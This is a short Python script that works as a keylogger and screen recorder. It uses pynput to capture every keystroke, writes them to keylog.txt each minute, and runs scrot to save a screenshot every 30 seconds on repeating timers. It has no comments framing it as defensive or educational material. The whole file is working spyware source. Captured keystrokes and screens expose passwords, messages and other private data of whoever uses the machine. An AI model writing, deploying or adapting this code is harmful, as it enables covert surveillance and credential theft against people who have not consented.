from pynput import keyboard
import threading
import os
import time

log = ""
screenshot_interval = 30  # seconds

# Function to log keystrokes
def on_press(key):
    global log
    try:
        log += key.char
    except:
        log += f" [{key}] "

# Function to save the keystrokes to a file
def save_log():
    global log
    with open("keylog.txt", "a") as f:
        f.write(log)
    log = ""
    threading.Timer(60, save_log).start()

# Function to take screenshots using scrot
def take_screenshot():
    filename = f"screenshot_{int(time.time())}.png"
    os.system(f"scrot {filename}")
    threading.Timer(screenshot_interval, take_screenshot).start()

# Start logging and screenshotting
listener = keyboard.Listener(on_press=on_press)
listener.start()
save_log()
take_screenshot()
listener.join()
